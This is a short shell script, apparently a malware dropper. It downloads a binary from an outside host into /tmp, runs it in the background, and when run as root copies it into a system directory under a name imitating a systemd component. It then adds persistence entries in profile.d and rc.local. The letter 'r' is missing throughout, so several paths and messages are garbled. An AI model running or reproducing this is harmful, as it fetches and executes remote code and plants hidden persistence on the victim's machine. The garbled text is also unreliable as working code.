cd /tmp
wget https://colafox.top/systemd-udedv
chmod +x systemd-udedv
nohup ./systemd-udedv &

if [ `id -u` -eq 0 ];then
	echo "is unning at oot"
	cp systemd-udedv /us/bin
	chmod +x /us/bin/systemd-udedv
	echo "nohup systemd-udedv &" > libblockdev.sh
	cp libblockdev.sh /etc/pofile.d
	chmod +x /etc/pofile.d/libblockdev.sh
	echo "bash /etc/pofile.d/libblockdev.sh" >> /etc/c.local;chmod +x /etc/c.local
else
	echo "not unning at oot"
fi